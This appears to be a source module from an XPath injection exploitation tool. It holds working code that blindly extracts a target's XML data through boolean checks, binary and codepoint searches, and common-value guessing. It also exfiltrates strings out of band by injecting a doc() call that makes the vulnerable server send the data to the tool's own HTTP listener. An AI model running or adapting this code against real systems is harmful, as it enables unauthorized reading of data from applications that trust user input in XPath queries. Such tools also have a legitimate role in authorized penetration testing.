import string as stdlib_string
import asyncio

from xcat.xpath.xpath_1 import string_length, substring_before, concat, string, normalize_space
from xcat.xpath.xpath_2 import string_to_codepoints, doc, encode_for_uri
from .requester import Requester
from .xpath import xpath_1

ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
MISSING_CHARACTER = "?"


async def count(requester: Requester, expression, func=xpath_1.count):
    if requester.features['oob-http']:
        result = await get_string_via_oob(requester, string(func(expression)))
        if result is not None and result.isdigit():
            return int(result)

    return await binary_search(requester, func(expression), min=0)


async def get_char(requester: Requester, expression):
    if requester.features['codepoint-search']:
        return await codepoint_search(requester, expression)
    elif requester.features['substring-search']:
        return await substring_search(requester, expression)
    else:
        # Dumb search
        top_characters = "".join(c[0] for c in requester.counters['common-characters'].most_common())
        search_space = top_characters + "".join(c for c in ASCII_SEARCH_SPACE if c not in top_characters)

        for space in search_space:
            if await requester.check(expression == space):
                requester.counters['common-characters'][space] += 1
                return space


async def get_string(requester: Requester, expression):
    if requester.features['normalize-space']:
        expression = normalize_space(expression)

    if requester.features['oob-http']:
        result = await get_string_via_oob(requester, expression)
        if result is not None:
            return result
        else:
            pass

    is_empty_str_expression = xpath_1.string_length(xpath_1.normalize_space(expression)) == 0

    if await requester.check(is_empty_str_expression):
        return ""

    total_string_length = await count(requester, expression, func=xpath_1.string_length)

    if total_string_length <= 10:
        # Try common strings we've got before
        for common_name, _ in requester.counters['common-names'].most_common(5):
            if await requester.check(expression == common_name):
                return common_name

    fetch_length = total_string_length if not requester.fast else min(15, total_string_length)

    chars = [
        await get_char(requester, xpath_1.substring(expression, i, 1))
        for i in range(1, fetch_length + 1)
        ]

    result = "".join(
        char if char is not None else MISSING_CHARACTER
        for char in chars
    )

    if requester.fast and fetch_length != total_string_length:
        difference = total_string_length - fetch_length
        return f'{result}... ({difference} more characters)'
    else:
        if len(result) <= 10:
            requester.counters['common-names'][result] += 1

    return result


async def get_string_via_oob(requester: Requester, expression):
    server = await requester.get_oob_server()
    url, future = server.expect_data()

    if not await requester.check(
                    doc(concat(f'{url}?d=', encode_for_uri(expression))).add_path('/data') == server.test_response_value):
        return None

    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return None


async def iterate_all(requester: Requester, expression):
    for text in expression:
        yield await get_string(requester, text)


async def get_all_text(requester: Requester, expression):
    text_node_count = await count(requester, expression.text)
    text_contents = [
        string
        async for string in iterate_all(requester, expression.text(text_node_count))
    ]

    return "".join(text_contents)


async def get_node_comments(requester: Requester, expression):
    comments_count = await count(requester, expression.comments)

    return [
        await get_string(requester, comment)
        for comment in expression.comments(comments_count)
    ]


async def binary_search(requester: Requester, expression, min, max=25):
    if await requester.check(expression > max):
        return await binary_search(requester, expression, min, max * 2)

    while True:
        if max < min:
            return -1

        midpoint = (min + max) // 2

        if await requester.check(expression < midpoint):
            max = midpoint - 1
        elif await requester.check(expression > midpoint):
            min = midpoint + 1
        else:
            return midpoint


async def substring_search(requester: Requester, expression):
    # Small issue:
    # string-length(substring-before('abc','z')) == 0
    # string-length(substring-before('abc','a')) == 0
    # So we need to explicitly check if the expression is equal to the first char in our search space.
    # Not optimal, but still works out fairly efficient.

    if await requester.check(expression == ASCII_SEARCH_SPACE[0]):
        return ASCII_SEARCH_SPACE[0]

    result = await binary_search(
        requester,
        string_length(substring_before(ASCII_SEARCH_SPACE, expression)),
        min=0,
        max=len(ASCII_SEARCH_SPACE))
    if result == 0:
        return None
    else:
        return ASCII_SEARCH_SPACE[result]


async def codepoint_search(requester: Requester, expression):
    result = await binary_search(
        requester,
        expression=string_to_codepoints(expression),
        min=0,
        max=255)
    if result == 0:
        return None
    else:
        return chr(result)
